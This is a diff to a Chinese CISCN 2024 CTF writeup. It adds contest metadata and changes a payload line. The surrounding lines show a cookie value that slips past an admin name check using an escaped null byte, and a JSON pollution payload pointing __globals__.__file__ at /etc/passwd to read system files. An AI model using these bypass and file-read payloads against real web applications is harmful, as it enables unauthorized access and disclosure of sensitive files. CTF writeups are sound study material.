@@ -71,6 +71,9 @@ prerequisites:
 - top chunk 缩技术
 - pwntools ELF + one_gadget
 - libc 2.23 hook 利用
+contest_normalized: "CISCN"
+contest_year: 2024
+subcategory_guess: "deserialization"
 ---
 # 第十七届全国大学生信息安全竞赛创新实践能力赛初赛Writeup
 
@@ -1906,7 +1909,7 @@ async def admin(request):
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0')
-Cookie: user="adm 73n"  //ASCII字符绕过
+Cookie: user="adm\\x0073n"  //ASCII字符绕过
 {"key":"__init__\\.__globals__\\.__file__","value":"/etc/passwd"}
 /home/ctf/.bash_history
 /root/flag
